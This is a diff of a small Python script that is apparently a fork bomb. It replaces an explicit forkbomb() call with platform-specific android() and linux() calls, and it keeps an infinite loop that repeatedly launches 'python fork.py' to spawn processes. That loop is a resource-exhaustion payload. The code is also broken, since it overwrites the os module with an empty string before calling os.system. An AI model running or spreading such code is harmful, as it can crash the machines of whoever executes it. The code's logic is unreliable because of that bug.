@@ -2,13 +2,18 @@ import os
 import platform
 from android import android
 from linux import linux
-from forkbomb import forkbomb
+os = ""
 if platform.system() == "Android":
-  android()
+  os = "android"
 elif platform.system() == "Linux":
-  linux()
+  os = "linux"
 else:
   pass
 while True:
   os.system("python fork.py")
-  forkbomb()
+  if os == "android":
+    android()
+  elif os == "linux":
+    linux()
+  else:
+    pass
